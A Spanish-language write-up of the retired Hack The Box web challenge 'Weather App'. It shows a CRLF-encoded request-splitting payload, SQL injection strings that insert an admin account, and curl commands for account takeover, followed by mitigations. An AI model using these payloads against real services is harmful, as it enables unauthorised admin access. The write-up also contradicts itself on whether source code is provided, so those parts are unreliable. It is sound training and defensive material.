---
challenge: Weather App
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, nodejs, ssrf, response-splitting, sqli, account-takeover]
---

# Weather App — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Se entrega el **código fuente** (Node.js + Express). El frontend hace de proxy hacia una API interna de clima (`/api/weather`) y concatena la ciudad en la URL sin sanear: **SSRF**. Combinado con **response splitting (CRLF)**, se inyecta una segunda petición HTTP contra el servicio interno, que además tiene **SQLi**. El resultado es crear un usuario administrador con contraseña conocida, entrar y leer la flag.

## Enunciado y superficie

Aplicación con descarga de código. Un campo de ciudad devuelve el tiempo. Existe un servicio interno que no está expuesto.

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

```bash
unzip weather-app.zip && cd app && npm install
grep -rn "http.get\|axios\|fetch\|request(" .
```

Puntos clave del código:

```js
// routes/weather.js
const city = req.body.city;
const url = `http://internal-api:3000/weather?city=${city}`;
http.get(url, ...)
```

La ciudad se concatena tal cual: no hay `encodeURIComponent` ni allowlist. Además, la respuesta del servicio interno se copia al cliente, lo que permite **inyectar cabeceras**.

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

### 1. Confirmar el SSRF

```bash
curl -s "http://<IP>:<puerto>/api/weather" -H 'Content-Type: application/json' \
  -d '{"city":"London"}'
```

### 2. Response splitting

El parámetro viaja en la URL de la petición interna. Con `%0d%0a` se corta la petición y se añade otra:

```text
city=London%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/admin%20HTTP/1.1
```

Eso permite hablar con endpoints del servicio interno que el proxy no expone.

### 3. SQLi en el servicio interno

El parámetro `city` del servicio interno acaba en una consulta:

```text
London' UNION SELECT ... -- -
```

Con la inyección se crea (o se modifica) un usuario con rol `admin` y contraseña conocida:

```sql
'; INSERT INTO users (username, password, role) VALUES ('admin','<hash_conocido>','admin'); -- -
```

### 4. Account takeover

```bash
curl -s -X POST "http://<IP>:<puerto>/login" \
  -d 'username=admin&password=<password>'
```

La sesión de administrador devuelve la flag en el panel.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Codificación en dos capas**: la ciudad va en JSON y luego en una URL; hay que codificar `%0d%0a` sin que el framework lo normalice.
- **Host interno**: el nombre del servicio sale del código (`internal-api`), no hace falta adivinarlo.
- **Node actualizado**: la versión vieja de Node es la que permite el *request smuggling* por CRLF; en versiones nuevas el vector desaparece.
- **Comillas en SQLi**: si el filtro bloquea `'`, probar variantes numéricas o `/**/`.

- Concatenar entrada en una URL es SSRF; concatenarla en una petición HTTP en crudo es *response splitting*.
- Un servicio interno «de confianza» suele tener SQLi porque nunca se expuso a internet.
- Mitigación: `encodeURIComponent`, allowlist de hosts, cliente HTTP que no acepte CRLF y consultas parametrizadas.

## Mitigaciones y detección

- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.
